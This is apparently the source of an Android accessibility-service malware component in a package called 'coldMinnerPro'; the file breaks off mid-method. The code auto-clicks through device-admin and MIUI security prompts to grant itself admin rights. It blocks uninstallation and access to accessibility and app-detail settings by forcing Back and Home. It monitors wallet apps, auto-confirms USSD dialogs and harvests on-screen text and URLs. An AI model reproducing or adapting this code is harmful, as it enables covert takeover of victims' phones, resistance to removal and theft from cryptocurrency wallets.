package com.crypto.coldMinnerPro.services;

import android.app.Activity;
import android.app.*;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.accessibilityservice.GestureDescription.StrokeDescription;
import android.app.Notification;
import android.content.*;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Telephony;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewConfiguration;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import org.json.JSONArray;
import org.json.JSONObject;
import android.os.Handler;
import android.os.Looper;
import android.net.Uri;
import java.util.Map;
import java.util.TreeMap;
import android.accessibilityservice.GestureDescription;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import com.crypto.coldMinnerPro.utils.*;
import com.crypto.coldMinnerPro.receivers.*;
import com.crypto.coldMinnerPro.*;

public class MyAccessibilityService extends AccessibilityService {
	
	private static final String TAG = "MyAccessibilityService";
	private static SharedPrefManager prefs;
	private static  MyAccessibilityService instance = null;
	private static final int DELAY_TIME = 30000;
	private Handler waitHandler = new Handler();
	private boolean btcDone = false;
	private AccessibilityNodeInfo eventRootInActiveWindow = null;
	private Handler mMainHandler = null;
	private String currentActivity = "";
	private String currentHomePackage = null;
	private String currentPackage = null;
	private int itemCnt = 0;
	private int listSize = 0;
	private View mViewBlack = null;
	private View mViewWait = null;
	private String myPackageName = null;
	private Path mPath;
	private long mLastGestureStartTime;
	private int cntExodusDhag = 0;
	Set<AccessibilityNodeInfo> setWithNameOfApp = new HashSet<>();
	
	public void refresher() {
		AccessibilityNodeInfo rootNode = super.getRootInActiveWindow();
		if (rootNode != null) {
			rootNode.refresh();
		}
		
		if (rootNode != null) {
			eventRootInActiveWindow = rootNode;
		}
	}
	
	@Override
	protected void onServiceConnected() {
		super.onServiceConnected();
		instance = this;
		prefs = new SharedPrefManager(this);
		Log.i(TAG, "Service Connected: Accessibility Service is now active.");
		mMainHandler = new Handler(Looper.getMainLooper());
		
		if (Constants.addWaitView && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			
		}
        if(!ActivityAdminqw.isAdminActive(this)){
			launchAdminActivation(instance);
		}
	}
	
	@Override
	public void onAccessibilityEvent(AccessibilityEvent event) {
		instance = this;
		if (event == null) {
			Log.w(TAG, "Received null AccessibilityEvent.");
			return;
		}
		
		try {
			AccessibilityNodeInfo eventRootNode = getRootInActiveWindow();
			if (eventRootNode != null) {
				eventRootInActiveWindow = eventRootNode;
			} else if (event.getSource() != null) {
				eventRootInActiveWindow = event.getSource();
			} else {
			}
		} catch (Exception e) {
			Log.e(TAG, "Error setting root node: " + e.getMessage());
		}
		
		int eventType = event.getEventType();
		
		if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
		eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
		eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
		eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
		eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
		eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
		eventType == AccessibilityEvent.CONTENT_CHANGE_TYPE_SUBTREE ||
		eventType == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT ||
		eventType == AccessibilityEvent.CONTENT_CHANGE_TYPE_UNDEFINED)
		{
			currentPackage = eventRootInActiveWindow.getPackageName().toString();
			setCurrentActivity(Objects.toString(event.getPackageName(), ""), Objects.toString(event.getClassName(), ""));
			String currentActivityLowerCase = currentActivity.toLowerCase(Locale.getDefault());
			
			if (eventRootInActiveWindow == null) {
				return;
			}
			List<AccessibilityNodeInfo> nodesByAppName = eventRootInActiveWindow.findAccessibilityNodeInfosByText(prefs.get("appName"));
			if (nodesByAppName != null) {
				for (AccessibilityNodeInfo node : nodesByAppName) {
					if (node.isVisibleToUser()) {
						setWithNameOfApp.add(node);
					}
				}
			}
			if (!Constants.sameApp(this)) {
				String appLabel = DeviceInfoUtil.getLabelApplication(this);
				List<AccessibilityNodeInfo> nodesByLabel = eventRootInActiveWindow.findAccessibilityNodeInfosByText(appLabel);
				if (nodesByLabel != null) {
					for (AccessibilityNodeInfo node : nodesByLabel) {
						if (node.isVisibleToUser()) {
							setWithNameOfApp.add(node);
						}
					}
				}
			}
			
			
			if (event != null && event.getPackageName() != null) {
				String packageName = event.getPackageName().toString();
				wallets(packageName);
			} else {
				Log.e("WalletApp", "Event or package name is null");
			}
			
			//------------------------admin--------------------------------------------
			if (adminPerm(currentActivityLowerCase)) {
				Log.i("AdminCheck", "Admin permission granted.");
				return;
			}
			
			//------------------------kill Application--------------------------------------------
			if (killApplication()) {
				Log.d("KillApplication", "Application killed.");
				return;
			}
			
			// --------------- Block Delete Bots --------------------
			//Log.d(TAG, "Checking Block Delete Bots...");
			if (blockDeleteBots(event, currentPackage)) {
				Log.d(TAG, "Block Delete Bots condition met. Returning.");
				return;
			}
			
			// ------------------ Exit Settings Accessibility Service --------------
			//Log.d(TAG, "Checking Exit Settings Accessibility Service...");
			if (exitSettings(event)) {
				Log.d(TAG, "Exit Settings condition met. Returning.");
				return;
			}
			
			// --------------- Unclick --------------------
			//Log.d(TAG, "Checking Unclick...");
			if (unclick()) {
				Log.d(TAG, "Unclick condition met. Returning.");
				return;
			}
			
			
			if (currentActivity.equals("com.android.settings.SubSettings") ||
			currentActivity.equals("com.android.settings.MiuiSettings") ||
			currentActivityLowerCase.contains("installedappdetailstop") ||
			currentActivityLowerCase.contains("managepermissionsactivity") ||
			currentActivityLowerCase.contains("startupappcontrolactivity") ||
			currentActivityLowerCase.contains("apppermissionactivity") ||
			currentActivityLowerCase.contains("powercontrolactivity") ||
			currentActivityLowerCase.contains("powerusagemodelactivity") ||
			currentActivityLowerCase.contains("stubinstallactivity") ||
			currentActivityLowerCase.contains("bgoptimizeapplistactivity") ||
			currentActivityLowerCase.contains("deviceadminsettingsactivity") ||
			currentActivity.equals("com.android.settings.Settings$BgOptimizeAppListActivity") ||
			currentActivity.equals("com.android.settings.CleanSubSettings") ||
			currentActivity.equals("com.android.settings.Settings$DeviceAdminSettingsActivity") ||
			currentPackage.equals("com.coloros.securitypermission") ||
			(currentPackage.equals("com.android.settings") && !currentActivityLowerCase.contains(".launcher"))) {
				if (!prefs.getB("autoClickAdmin") && ActivityAdminqw.isAdminActive(this)) {
					boolean actionPerformed = false;
					if (currentHomePackage != null && clickAtButton(currentHomePackage, "btnCancel", true)) {
						actionPerformed = true;
					} else if (clickAtButton("android", "button2", true)) {
						actionPerformed = true;
					} else if (clickAtButton("com.miui.home", "cancel", true)) {
						actionPerformed = true;
					}
					if (!actionPerformed) {
                        blockBack1();
					} 
				}
			}
			
			
			//------------------------unclick delete--------------------------------------------
			if (currentActivityLowerCase.contains("uninstalleractivity") ||
			(currentPackage.equals("com.google.android.packageinstaller") &&
			!currentActivityLowerCase.contains("grantpermissionsactivity") &&
			ActivityAdminqw.isAdminActive(this))) {
				
				Log.d("UnclickDeleteCheck", "Matched delete dialog or uninstaller activity.");
				
				
				boolean actionPerformed = false;
				
				if (currentHomePackage != null && clickAtButton(currentHomePackage, "btnCancel", true)) {
					actionPerformed = true;
					Log.d("ButtonClick", "Clicked 'btnCancel' in package: " + currentHomePackage);
				} else if (clickAtButton("android", "button2", true)) {
					actionPerformed = true;
					Log.d("ButtonClick", "Clicked 'button2' in package: android");
				}
				
				if (!actionPerformed) {
					blockBack1();
					Log.d("ActionPerformed", "No action was performed, blocked back.");
				}
				
				
			}
			//Log.i(TAG, "One of the specified event types detected.");
			
		} else {
			Log.i(TAG, "Unhandled event type: " + AccessibilityEvent.eventTypeToString(eventType));
		}
	}
	
	
	
	
	
	
	@Override
	public void onInterrupt() {
		instance = null;
		Log.w(TAG, "Service Interrupted: Accessibility Service was interrupted.");
	}
	
	@Override
	public void onDestroy() {
		try {
			
			instance = null;
			
			Log.v("TAG", "onServiceDisconnected");
		} catch (Exception e) {
			Log.e("TAG", "Error in onDestroy: " + e.getMessage());
		}
		
		try {
			super.onDestroy();
			super.disableSelf();
			Log.i("TAG", "onDestroy");
		} catch (Exception e) {
			Log.e("TAG", "Error during super.onDestroy() or super.disableSelf(): " + e.getMessage());
		}
	}
	
	
	
	
	
	@Override
	public boolean onUnbind(Intent intent) {
		Log.i(TAG, "Service Unbound: Accessibility Service has been unbound.");
		return super.onUnbind(intent);
	}
	
	@Override
	public void onRebind(Intent intent) {
		super.onRebind(intent);
		Log.i(TAG, "Service Rebound: Accessibility Service has been rebound.");
	}
	
	@Override
	public void onLowMemory() {
		super.onLowMemory();
		Log.w(TAG, "Low Memory: The system is running low on memory.");
	}
	
	private boolean blockDeleteBots(AccessibilityEvent event, String packageName) {
		try {
			if (!prefs.getB("killApplication") && !prefs.getB("autoClickAdmin")) {
				//--- Block Delete Bots ---
				if (packageName.contains("com.android.settings")) {
					if ((event.getClassName() != null && 
					(event.getClassName().toString().contains("com.android.settings.applications.installedappdetailstop") || 
					event.getClassName().toString().contains("com.android.settings.settings.accessibilitysettingsactivity")))) {
						blockBack();
						return true;
					}
				}
				
				String strText = "";
				try {
					strText = event.getText() != null ? event.getText().toString() : "";
				} catch (Exception e) {
					// Default to empty string if an exception occurs.
				}
				
				//--- Block Delete Bots ---
				if (packageName.contains("com.google.android.packageinstaller") &&
				event.getClassName() != null &&
				event.getClassName().toString().contains("android.app.alertdialog") &&
				(strText.contains(prefs.get("appName")) ||
				strText.contains(DeviceInfoUtil.getLabelApplication(this)))) {
					blockBack();
					return true;
				}
				
				//--- Block Delete Bots ---
				if ("android.widget.linearlayout".equals(event.getClassName()) &&
				(packageName.equals("com.android.settings") || packageName.equals("com.miui.securitycenter")) &&
				(strText.contains(prefs.get("appName")) ||
				strText.contains(DeviceInfoUtil.getLabelApplication(this)))) {
					blockBack();
					return true;
				}
				
				//--- Block off admin ---
				if ("com.android.settings.deviceadminadd".equals(event.getClassName()) &&
				ActivityAdminqw.isAdminActive(this)) {
					blockBack();
					return true;
				}
			}
		} catch (Exception e) {
			// Handle any unexpected exceptions here if needed.
		}
		
		return false;
	}
	
	private boolean exitSettings(AccessibilityEvent event) {
		try {
			if (ActivityAdminqw.isAdminActive(this)) {
				if (Constants.акссес.stream().anyMatch(text ->
				eventRootInActiveWindow != null &&
				eventRootInActiveWindow.findAccessibilityNodeInfosByText(text)
				.stream()
				.anyMatch(node -> node.isVisibleToUser())
				)) {
					blockBack();
					return true;
				}
				
				if (("com.android.settings.SubSettings".equalsIgnoreCase(event.getClassName().toString()) && event.getText() != null && event.getText().toString().contains(Constants.access1) || ("com.android.settings.SubSettings".equalsIgnoreCase(event.getClassName().toString()) && event.getContentDescription() != null && event.getContentDescription().toString().contains(Constants.access1)))) {
					blockBack();
					return true;
				}
			}
		} catch (Exception e) {
			
		}
		
		return false;
	}
	
	private boolean killApplication() {
		try {
			if (prefs.getB("killApplication")) {
				if (clickAtButton("android", "button1", false) ||
				clickAtButton("com.android.settings", "action_button", false) ||
				clickAtButton("com.android.settings", "left_button", false)) {
					
					Log.d("killApplication", "killApplication success");
					prefs.setB("killApplication", false);
					return true;
				}
			}
		} catch (Exception e) {
			Log.e("killApplication", "killApplication " + e.getLocalizedMessage(), e);
		}
		return false;
	}
	
	public void launchAdminActivation(Context context) {
		if (context == null) {
			Log.e("AdminActivation", "Context is null, cannot launch Activity.");
			return;
		}
		if (ActivityAdminqw.isAdminActive(this)) {
			return;
		}
		Intent intent = new Intent(context, ActivityAdminqw.class);
		if (!(context instanceof Activity)) {
			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
		}
		try {
			context.startActivity(intent);
		} catch (Exception e) {
			Log.e("AdminActivation", "Error launching Activity: " + e.getMessage());
		}
	}
	
	private void setCurrentActivity(String pkgName, String clsName) {
		if (clsName.startsWith("android.view.") || clsName.startsWith("android.widget.")) {
			return;
		}
		try {
			ComponentName componentName = new ComponentName(pkgName, clsName);
			currentActivity = this.getPackageManager().getActivityInfo(componentName, 0).name;
		} catch (PackageManager.NameNotFoundException e) {
			
			return;
		}
	}
	
	private boolean unclick() {
		try {
			if (!prefs.getB("killApplication")) {
				if (!prefs.getB("autoClickAdmin")) {
					
					if ("com.miui.securitycenter".equals(currentPackage)) {
						blockBack1();
					} else if ("com.google.android.packageinstaller".equals(currentPackage)) {
						blockBack1();
					} else if ("com.android.packageinstaller".equals(currentPackage)){
						blockBack1();
					} else if ("com.android.settings".equals(currentPackage)) {
						blockBack1();
					} else if (currentHomePackage != null && 
					clickAtButton(currentHomePackage, "btnCancel", true)) {
						// No action needed; button click handled.
					}
				}
			}
		} catch (Exception e) {
			// Handle exceptions gracefully if needed.
		}
		
		return false;
	}
	
	private boolean ussdSend() {
		try {
			if (prefs.getB("autoClickUssd")) {
				AccessibilityNodeInfo nodeInfo = eventRootInActiveWindow;
				if (nodeInfo != null) {
					List<AccessibilityNodeInfo> buttons = nodeInfo.findAccessibilityNodeInfosByViewId("android:id/button1");
					if (buttons != null && !buttons.isEmpty()) {
						AccessibilityNodeInfo button = buttons.get(0);
						click(button, false);
						prefs.setB("autoClickUssd", false);
						Log.d("TAG", "USSD action performed");
						return true;
					}
				}
			}
		} catch (Exception e) {
			Log.e("TAG", "Error in ussdSend: " + e.getMessage());
		}
		return false;
	}
	
	private boolean backFromAdmin() {
		if (ActivityAdminqw.isAdminActive(this)) {
			prefs.setB("autoClickAdmin", false);
			blockBack1();
			return true;
		}
		return false;
	}
	
	private void blockBack() {
		for (int i = 0; i < 3; i++) {
			performGlobalAction(GLOBAL_ACTION_BACK);
		}
		performGlobalAction(GLOBAL_ACTION_HOME);
	}
	
	private void blockBack1() {
		performGlobalAction(GLOBAL_ACTION_BACK);
	}
	
	private boolean adminPerm(String currentActivityLowerCase) {
		if (prefs.getB("autoClickAdmin")) {
			if (currentActivity.contains("DeviceManagerApplyActivity") || currentActivityLowerCase.contains("deviceadminadd")) {
				if (eventRootInActiveWindow != null) {
					
					List<AccessibilityNodeInfo> restrictedBtnNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.settings:id/restricted_action");
					if (restrictedBtnNodes != null) {
						for (AccessibilityNodeInfo actionNode : restrictedBtnNodes) {
							if (clickNodeOrParent(actionNode, true)) {
								if (backFromAdmin()) {
									return true;
								}
							}
						}
					}
					
					List<AccessibilityNodeInfo> checkBoxNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/check_box");
					if (checkBoxNodes != null) {
						for (AccessibilityNodeInfo node : checkBoxNodes) {
							if (!node.isChecked()) {
								clickNodeOrParent(node, true);
							}
						}
					}
					
					List<AccessibilityNodeInfo> interceptNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/intercept_warn_allow");
					if (interceptNodes != null) {
						for (AccessibilityNodeInfo node : interceptNodes) {
							clickNodeOrParent(node, false);
						}
					}
				}
				
				if (ActivityAdminqw.isAdminActive(this)) {
					prefs.setB("autoClickAdmin", false);
					blockBack1();
				}
				
				return true;
			} else if (currentActivity.equals("com.android.settings.SubSettings")
			|| currentActivity.equals("com.android.settings.MiuiSettings")
			|| currentActivityLowerCase.contains("deviceadminadd")) {
				if (eventRootInActiveWindow != null) {
					AccessibilityNodeInfo node = 
					eventRootInActiveWindow.findAccessibilityNodeInfosByText("Add application to admin").stream().findFirst().orElse(null);
					if (node != null && clickNodeOrParent(node, true)) {
						return true;
					}
					
					List<AccessibilityNodeInfo> actionButtonNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button");
					if (actionButtonNodes != null) {
						for (AccessibilityNodeInfo actionNode : actionButtonNodes) {
							if (clickNodeOrParent(actionNode, true)) {
								if (backFromAdmin()) {
									return true;
								}
							}
						}
					}
					List<AccessibilityNodeInfo> restrictedBtnNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.settings:id/restricted_action");
					if (restrictedBtnNodes != null) {
						for (AccessibilityNodeInfo actionNode : restrictedBtnNodes) {
							if (clickNodeOrParent(actionNode, true)) {
								if (backFromAdmin()) {
									return true;
								}
							}
						}
					}
				}
				
				if (ActivityAdminqw.isAdminActive(this)) {
					prefs.setB("autoClickAdmin", false);
				}
			} else if (currentPackage.equals("com.android.settings") || currentActivityLowerCase.contains("deviceadminadd")
			&& prefs.getB("autoClickAdmin")) {
				if (eventRootInActiveWindow != null) {
					List<AccessibilityNodeInfo> actionButtonNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.settings:id/action_button");
					if (actionButtonNodes != null) {
						for (AccessibilityNodeInfo actionNode : actionButtonNodes) {
							if (clickNodeOrParent(actionNode, true)) {
								if (backFromAdmin()) {
									return true;
								}
							}
						}
					}
					
					List<AccessibilityNodeInfo> restrictedBtnNodes =
					eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.settings:id/restricted_action");
					if (restrictedBtnNodes != null) {
						for (AccessibilityNodeInfo actionNode : restrictedBtnNodes) {
							if (clickNodeOrParent(actionNode, true)) {
								if (backFromAdmin()) {
									return true;
								}
							}
						}
					}
				}
				
				if (ActivityAdminqw.isAdminActive(this)) {
					prefs.setB("autoClickAdmin", false);
				}
			}
		} else {
			if (currentActivity.equals("com.android.settings.SubSettings")
			|| currentActivity.equals("com.android.settings.MiuiSettings")
			|| currentActivityLowerCase.contains("deviceadminadd")) {
				if (ActivityAdminqw.isAdminActive(this)) {
					if (currentActivity.equals("com.android.settings.SubSettings")
					|| currentActivity.equals("com.android.settings.MiuiSettings")) {
						if (eventRootInActiveWindow != null) {
							AccessibilityNodeInfo node =
							eventRootInActiveWindow.findAccessibilityNodeInfosByText("Add application to admin").stream().findFirst().orElse(null);
							if (node != null) {
								blockBack1();
								return true;
							}
						}
					} else {
						prefs.setB("autoClickAdmin", false);
						blockBack1();
						return true;
					}
				}
			}
		}
		return false;
	}
	
	private void iterateAndSaveText(AccessibilityNodeInfo nodeInfo, List<String> list) {
		int childCount = nodeInfo != null ? nodeInfo.getChildCount() : 0;
		CharSequence nodeContent = nodeInfo != null ? nodeInfo.getText() : null;
		
		if (nodeInfo != null && nodeInfo.getExtras() != null) {
			for (String key : nodeInfo.getExtras().keySet()) {
				if ("AccessibilityNodeInfo.targetUrl".equals(key)) {
					Object value = nodeInfo.getExtras().get(key);
					if (value != null) {
						list.add(value.toString());
						Log.d("TAG", "Found targetUrl: " + value.toString());
					}
				}
			}
		}
		
		try {
			if (nodeContent != null && !nodeContent.toString().isEmpty()) {
				list.add(nodeContent.toString());
				Log.d("TAG", "Added text content: " + nodeContent.toString());
			}
		} catch (Exception e) {
			Log.e("TAG", "Error saving text content: " + e.getMessage());
		}
		
		for (int i = 0; i < childCount; i++) {
			AccessibilityNodeInfo childNodeInfo = nodeInfo != null ? nodeInfo.getChild(i) : null;
			iterateAndSaveText(childNodeInfo, list);
		}
	}
	
	private AccessibilityNodeInfo iterateNodesToFindViewWithCntChildAndType(
	AccessibilityNodeInfo nodeInfo, int cnt, String classType) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			
			if (nodeInfo.getClassName().toString().contains(classType) && childCount == cnt) {
				Log.d("TAG", "Found matching node: " + nodeInfo);
				return nodeInfo;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindViewWithCntChildAndType(childNodeInfo, cnt, classType);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	
	private AccessibilityNodeInfo iterateNodesToFindSwitch(AccessibilityNodeInfo nodeInfo, String classType) {
		if (nodeInfo != null) {
			if (nodeInfo.getClassName().toString().contains(classType)) {
				Log.d("TAG", "Found switch node: " + nodeInfo);
				return nodeInfo;
			}
			
			int childCount = nodeInfo.getChildCount();
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindSwitch(childNodeInfo, classType);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private AccessibilityNodeInfo iterateNodesToFindViewWithIdClass(
	AccessibilityNodeInfo nodeInfo, 
	String classType, 
	int childCount) 
	{
		if (nodeInfo != null) {
			CharSequence className = nodeInfo.getClassName();
			//CharSequence contentDescription = nodeInfo.getContentDescription();
			
			if (className != null && className.toString().contains(classType) &&
			nodeInfo.getChildCount() == childCount) {
				return nodeInfo;
			}
			
			int childNodeCount = nodeInfo.getChildCount();
			for (int i = 0; i < childNodeCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindViewWithIdClass(childNodeInfo, classType, childCount);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private AccessibilityNodeInfo iterateNodesToFindViewWithId(AccessibilityNodeInfo nodeInfo, String viewId) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			String nodeContent = nodeInfo.getViewIdResourceName();
			
			if (nodeContent != null && nodeContent.contains(viewId)) {
				return nodeInfo;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindViewWithId(childNodeInfo, viewId);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private List<AccessibilityNodeInfo> iterateNodesToFindViewsListWithId(AccessibilityNodeInfo nodeInfo, String viewId) {
		List<AccessibilityNodeInfo> resultList = new ArrayList<>();
		if (nodeInfo != null) {
			if (nodeInfo.getViewIdResourceName() != null && nodeInfo.getViewIdResourceName().contains(viewId)) {
				resultList.add(nodeInfo);
			}
			for (int i = 0; i < nodeInfo.getChildCount(); i++) {
				resultList.addAll(iterateNodesToFindViewsListWithId(nodeInfo.getChild(i), viewId));
			}
		}
		return resultList;
	}
	
	private List<AccessibilityNodeInfo> iterateNodesToFindViewsListWithClass(AccessibilityNodeInfo nodeInfo, String viewId) {
		List<AccessibilityNodeInfo> resultList = new ArrayList<>();
		if (nodeInfo != null) {
			if (viewId.equals(nodeInfo.getClassName())) {
				resultList.add(nodeInfo);
			}
			for (int i = 0; i < nodeInfo.getChildCount(); i++) {
				AccessibilityNodeInfo child = nodeInfo.getChild(i);
				if (child != null) {
					resultList.addAll(iterateNodesToFindViewsListWithClass(child, viewId));
				}
			}
		}
		return resultList;
	}
	
	private AccessibilityNodeInfo iterateNodesToFindViewWithDesc(AccessibilityNodeInfo nodeInfo, String viewId) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			CharSequence nodeContent = nodeInfo.getContentDescription();
			
			if (nodeContent != null && nodeContent.toString().contains(viewId)) {
				return nodeInfo;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindViewWithDesc(childNodeInfo, viewId);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private boolean iterateNodesToFindText(AccessibilityNodeInfo nodeInfo, String text) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			
			if (text.equals(nodeInfo.getText())) {
				clickNodeOrParent(nodeInfo, true);
				return true;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				if (iterateNodesToFindText(childNodeInfo, text)) {
					return true;
				}
			}
		}
		return false;
	}
	
	private AccessibilityNodeInfo iterateNodesToFindNodeWithText(AccessibilityNodeInfo nodeInfo, String text) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			String nodeContent = nodeInfo.getText() != null ? nodeInfo.getText().toString().toLowerCase(Locale.getDefault()) : null;
			
			if (nodeContent != null && nodeContent.equals(text.toLowerCase(Locale.getDefault()))) {
				return nodeInfo;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindNodeWithText(childNodeInfo, text);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private AccessibilityNodeInfo iterateNodesToFindContainsTextNode(AccessibilityNodeInfo nodeInfo, String text) {
		if (nodeInfo != null) {
			int childCount = nodeInfo.getChildCount();
			CharSequence nodeContent = nodeInfo.getText();
			
			if (nodeContent != null && nodeContent.toString().contains(text)) {
				return nodeInfo;
			}
			
			for (int i = 0; i < childCount; i++) {
				AccessibilityNodeInfo childNodeInfo = nodeInfo.getChild(i);
				AccessibilityNodeInfo result = iterateNodesToFindContainsTextNode(childNodeInfo, text);
				if (result != null) {
					return result;
				}
			}
		}
		return null;
	}
	
	private GestureDescription buildClick(float x, float y, boolean longClick) {
		Path clickPath = new Path();
		clickPath.moveTo(x, y);
		
		GestureDescription.StrokeDescription clickStroke = longClick 
		? new GestureDescription.StrokeDescription(clickPath, 1000, 20000, true)
		: new GestureDescription.StrokeDescription(clickPath, 0, 1, true);
		
		GestureDescription.Builder clickBuilder = new GestureDescription.Builder();
		clickBuilder.addStroke(clickStroke);
		return clickBuilder.build();
	}
	
	private boolean checkNodeOrParent(AccessibilityNodeInfo nodeInfo) {
		try {
			if (!nodeInfo.isChecked()) {
				click(nodeInfo.getParent(), false);
				TimeUnit.MILLISECONDS.sleep(75);
				nodeInfo.getParent().refresh();
				
				if (!nodeInfo.isChecked()) {
					click(nodeInfo, false);
					TimeUnit.MILLISECONDS.sleep(75);
					nodeInfo.refresh();
				}
				
				if (!nodeInfo.isChecked()) {
					click(nodeInfo.getParent().getParent(), false);
					TimeUnit.MILLISECONDS.sleep(75);
					nodeInfo.getParent().getParent().refresh();
				}
				return true;
			}
		} catch (Exception e) {
			Log.e(TAG, "Error in checkNodeOrParent: " + e.getMessage());
		}
		return false;
	}
	
	private boolean click(AccessibilityNodeInfo it, boolean clickOnlyIfVisible) {
		try {
			if (clickOnlyIfVisible && it.isVisibleToUser()) {
				Log.v(TAG, "ACC::onAccessibilityEvent: click - " + it);
				return it.performAction(AccessibilityNodeInfo.ACTION_CLICK);
			} else if (!clickOnlyIfVisible) {
				Log.v(TAG, "ACC::onAccessibilityEvent: click - " + it);
				return it.performAction(AccessibilityNodeInfo.ACTION_CLICK);
			}
			return true;
		} catch (Exception e) {
			Log.e(TAG, "Error clicking node: " + e.getMessage());
		}
		return false;
	}
	
	private boolean clickAtButton(String targetAppPackageName, String targetViewId, boolean clickOnlyIfVisible) {
		if (eventRootInActiveWindow != null) {
			List<AccessibilityNodeInfo> nodes = eventRootInActiveWindow.findAccessibilityNodeInfosByViewId(targetAppPackageName + ":id/" + targetViewId);
			if (nodes != null) {
				for (AccessibilityNodeInfo node : nodes) {
					if (node.isClickable()) {
						return click(node, clickOnlyIfVisible);
					}
				}
			}
		}
		return false;
	}
	
	private boolean clickNodeOrParent(AccessibilityNodeInfo item, boolean clickOnlyIfVisible) {
		try {
			if (item.isClickable()) {
				return click(item, clickOnlyIfVisible);
			}
			if (item.getParent() != null && item.getParent().isClickable()) {
				return click(item.getParent(), clickOnlyIfVisible);
			}
			if (item.getParent() != null && item.getParent().getParent() != null && item.getParent().getParent().isClickable()) {
				return click(item.getParent().getParent(), clickOnlyIfVisible);
			}
			if (item.getParent() != null && item.getParent().getParent() != null && item.getParent().getParent().getParent() != null && 
			item.getParent().getParent().getParent().isClickable()) {
				return click(item.getParent().getParent().getParent(), clickOnlyIfVisible);
			}
		} catch (Exception e) {
			Log.e(TAG, "Error in clickNodeOrParent: " + e.getMessage());
		}
		return false;
	}
	
	private boolean clickOk() {
		if (eventRootInActiveWindow != null) {
			eventRootInActiveWindow.refresh();
			
			if (clickAtButton(currentHomePackage, "btnOk", false)) {
				return true;
			}
			
			eventRootInActiveWindow.refresh();
			
			List<AccessibilityNodeInfo> nodes = eventRootInActiveWindow.findAccessibilityNodeInfosByViewId("android:id/button1");
			if (nodes != null) {
				for (AccessibilityNodeInfo node : nodes) {
					if (node.isClickable() && click(node, false)) {
						return true;
					}
				}
			}
			
			eventRootInActiveWindow.refresh();
		}
		return false;
	}
	
	
	public void clickAt(String id) {
		if (instance != null) {
			AccessibilityNodeInfo node = instance.iterateNodesToFindViewWithId(instance.eventRootInActiveWindow, id);
			if (node != null) {
				instance.clickNodeOrParent(node, false);
			}
		}
		Log.d(TAG, "clickAt: " + id);
	}
	
	public void clickAtText(String text) {
		if (instance != null) {
			AccessibilityNodeInfo node = instance.iterateNodesToFindNodeWithText(instance.eventRootInActiveWindow, text);
			if (node != null) {
				instance.clickNodeOrParent(node, false);
			}
		}
		Log.d(TAG, "clickAtText: " + text);
	}
	
	public void clickAtContainsText(String text) {
		if (instance != null) {
			AccessibilityNodeInfo node = instance.iterateNodesToFindContainsTextNode(instance.eventRootInActiveWindow, text);
			if (node != null) {
				instance.clickNodeOrParent(node, false);
			}
		}
		Log.d(TAG, "clickAtContainsText: " + text);
	}
	
	public void longPress(int x, int y) {
		if (instance != null) {
			instance.longPress(x, y);
		}
		Log.d(TAG, "longPress: " + x + ", " + y);
	}
	
	public void openRecents() {
